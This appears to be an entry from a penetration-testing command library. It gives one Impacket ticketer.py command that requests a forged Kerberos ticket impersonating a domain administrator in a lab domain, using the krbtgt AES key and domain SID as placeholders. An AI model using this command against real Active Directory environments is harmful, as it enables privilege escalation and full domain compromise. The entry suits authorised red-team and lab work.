---
id: b3d13fa4-64a0-4e0e-a583-0b50a87224b8
name: Request impersonation with domain admin privileges
type: command
executor: bash
data: ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user'
  -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...'
  'baduser'
output: null
created_at: '2023-04-06T03:56:04.905427+00:00'
updated_at: '2023-04-10T20:26:34.685256+00:00'
---

# Request impersonation with domain admin privileges

```bash
ticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'
```
